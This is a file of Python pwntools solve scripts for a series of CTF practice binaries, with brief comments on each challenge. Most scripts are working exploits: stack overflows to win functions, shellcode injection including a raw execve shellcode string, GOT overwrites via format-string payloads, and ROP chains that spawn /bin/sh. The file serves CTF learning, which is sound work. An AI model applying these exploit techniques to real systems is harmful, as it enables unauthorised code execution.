#All of the following challenges were hacking speedruns in a CTF I participated in

#Chall_04
#Looking at the decompilation of the executable, having no canary and no PIE, this is a simple buffer overflow to overwrite the return address
from pwn import*

p=process("./chall_04")
#Receive their puts statements
p.recv()
#Junk sendline
p.sendline()
#Fill up the stack and overwrite the return address to a win function containing system(bin/sh)
p.sendline(b'a'*(0x40-8)+p64(0x004005b7))
p.interactive()

#chall_05
#Another buffer overflow but this time with PIE included
from pwn import*

p=process("./chall_05")
elf=ELF('./chall_05')
p.recv()
p.sendline()
p.recvuntil(": ")
#receive the main address leak to find the offsets
mainaddr=int(p.recv(),16)
elf.address=mainaddr-elf.sym['main']
#overflow the return address to return to the win function
p.sendline(b'a'*(0x40-8)+p64(elf.sym['win']))
p.interactive()

#chall_06
#No obvious buffer overflow but NX is partially disabled, allowing us to execute the stack
from pwn import*
import re

p=process("./chall_06")
p.recvuntil(": ")
resp=p.recv()[:-1]
#receive the address to which we write that is executable
addr=int(resp,16)
context.arch="amd64"
shell=asm(shellcraft.amd64.sh())
payload=b'a'*(0x40-8)+p64(addr)
#send shell code for a system call to bin/sh to the executable address
p.sendline(shell)
p.recv()
#overflow the buffer into the executable stack address to gain control
p.sendline(payload)
p.interactive()

#chall_07
#Another shell code problem
from pwn import*

context.arch = "amd64"
shell=b''
shell += asm(shellcraft.amd64.sh())
p=process("./chall_07")
p.recvuntil("humanity")
#Control where to put the shell code as we do not get a leak this time
p.sendline()
#place the shell code in the address the stack address will later call
p.sendline(shell)
p.interactive()

#chall_08
#This problem uses the GOT table to execute functions we would otherwise have no access to
from pwn import*

elf = ELF("chall_08")
p=process("./chall_08")
#send the win function address into an address inside the got to table to be called when obj.target it called
p.sendline(str((elf.got.puts-elf.sym.target)//8))
p.sendline(str(elf.sym.win))
p.interactive()

#chall_09
#This problem was more reversing, realizing there is an xor between what ever you input and 0x30
from pwn import*
p=process("./chall_09")
elf=ELF("chall_09")
#xor 0x30 and what the key object to get the proper input based on the properties of xor
p.sendline(xor(elf.string(elf.sym.key),b'\x30'))
p.interactive()

#chall_10
#The first rop chaining problem, not complex but deals with sending in parameters to a function
from pwn import*

p=process("./chall_10")
elf =ELF("chall_10")
p.recv()
p.sendline()
#overflow the buffer to the win address then add the 2 parameters needed to get access to the system call
p.sendline(b'a'*(0x3a+4)+p32(elf.sym.win)+p32(0x08048345)+p32(0xdeadbeef))
p.interactive()

#chall_11
#This was a printf vulnerability mixed with a GOT vulnerability
from pwn import*
p=process("./chall_11")
elf= ELF("chall_11")
p.sendline()
#The six represents how many memory addresses past the printf is where our input is stored
#We use this information to overwrite the GOT value for fflush to be the address of the win function so when fflush is called it actually calls win
p.sendline(fmtstr_payload(6,{elf.got.fflush:elf.sym.win}))
p.interactive()

#chall_12
#This is the same problem as above but with PIE enabled so first we had to gain a leaked address to learn the offsets then repeat the steps
from pwn import*

p=process("./chall_12")
elf =ELF("chall_12")
p.recvuntil(": ")
leak = p.recv()
print(leak)
#our leaked address
leak = int(leak[:-1],16)
print(hex(leak))
p.sendline()
#setting all functions to their correct places with the offsets
elf.address = leak - elf.sym.main
p.sendline(fmtstr_payload(6,{elf.got.fflush:elf.sym.win}))
p.interactive()

#chall_13
#This was another simple buffer overflow where we need to overwrite the return address
from pwn import*

p=process("./chall_13")
elf = ELF("chall_13")
p.recv()
p.sendline()
#overwrite the return address to system func which calls system(bin/sh)
p.sendline(b'a'*0x3e+p32(elf.sym.systemFunc))
p.interactive()

#chall_14
#A more complex rop chaining problem with two different solutions.
from pwn import*

#popRDI=0x0000000000400696 
#useful addresses to pop certain registers so we can control their values
popRSI=0x0000000000410263 
popRAX=0x00000000004158f4
popr13=0x000000000040da7b
popRDI=0x0000000000468a29
sys=0x000000000040120c
popRDX=0x0000000000449b15
elf = ELF("chall_14")
p=process("./chall_14")
p.recv()
p.sendline()
#Creates a payload to overwrite the buffer, put bin/sh into r13, pop rdi and put the address of r13 into it, set all other major registers to 0
# then call on execve with the syscall 59
payload = b'a'*0x68+p64(popr13)+b'/bin/sh\x00'+p64(popRDI)+p64(0)+p64(0)+p64(0)+p64(0)+p64(popRSI)+p64(0)+p64(popRDX)+p64(0)+p64(popRAX)+p64(59)+p64(sys)
p.sendline(payload)
p.interactive()

#Second solution using an auto-pwner
#from struct import pack

#p = lambda x : pack('Q', x)

#IMAGE_BASE_0 = elf.address # 913a7aa51d9185a1088a36aa69b5a863758c4a92a8f050297c9491bd33b78d65
#rebase_0 = lambda x : p64(x + IMAGE_BASE_0)

#rop = b''

#rop += rebase_0(0x000000000000da7b) # 0x000000000040da7b: pop r13; ret; 
#rop += b'//bin/sh'
#rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret; 
#rop += rebase_0(0x00000000002b90e0)
#rop += rebase_0(0x0000000000068a29) # 0x0000000000468a29: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
#rop += p(0xdeadbeefdeadbeef)
#rop += p(0xdeadbeefdeadbeef)
#rop += p(0xdeadbeefdeadbeef)
#rop += p(0xdeadbeefdeadbeef)
#rop += rebase_0(0x000000000000da7b) # 0x000000000040da7b: pop r13; ret; 
#rop += p(0x0000000000000000)
#rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret; 
#rop += rebase_0(0x00000000002b90e8)
#rop += rebase_0(0x0000000000068a29) # 0x0000000000468a29: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
#rop += p(0xdeadbeefdeadbeef)
#rop += p(0xdeadbeefdeadbeef)
#rop += p(0xdeadbeefdeadbeef)
#rop += p(0xdeadbeefdeadbeef)
#rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret; 
#rop += rebase_0(0x00000000002b90e0)
#rop += rebase_0(0x0000000000010263) # 0x0000000000410263: pop rsi; ret; 
#rop += rebase_0(0x00000000002b90e8)
#rop += rebase_0(0x000000000004c086) # 0x000000000044c086: pop rdx; ret; 
#rop += rebase_0(0x00000000002b90e8)
#rop += rebase_0(0x00000000000158f4) # 0x00000000004158f4: pop rax; ret; 
#rop += p(0x000000000000003b)
#rop += rebase_0(0x0000000000074e35) # 0x0000000000474e35: syscall; ret; 
#p.sendline(b'a'*0x68+rop)


#chall_15
#Another shell problem, this time needing smaller shell code and offsets to the address
from pwn import*

p=process("./chall_15")
elf = ELF("chall_15")
context.arch = "amd64"
#shell = asm(shellcraft.amd64.sh())
p.sendline()
p.recvuntil(": ")
#receive the leaked address of where we can execute on the stack
addr = p.recvrepeat(.2)[:-1]
shell = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
print(addr)
addr = int(addr,16)
#place the shell code onto the stack after the leaked address
payload = b'a'*(0x4e-0x44)+p32(0xfacade)+shell
print(len(payload))
payload+=b'b'*(0x4e-len(payload)-0xc)+p32(0xfacade)
print(len(payload))
#call on the shell code with the leak plus the offset of where we placed the shell
payload+=b'c'*(0x4e-len(payload))+p64(addr+(14))
print(len(payload))
p.sendline(payload)
p.interactive()

#chall_16
#a simple reversing problem of just sending in the correct value they had stored as a global variable
from pwn import*
p=process("./chall_16")
elf = ELF("chall_16")
p.sendline(elf.string(elf.sym.key))
p.interactive()
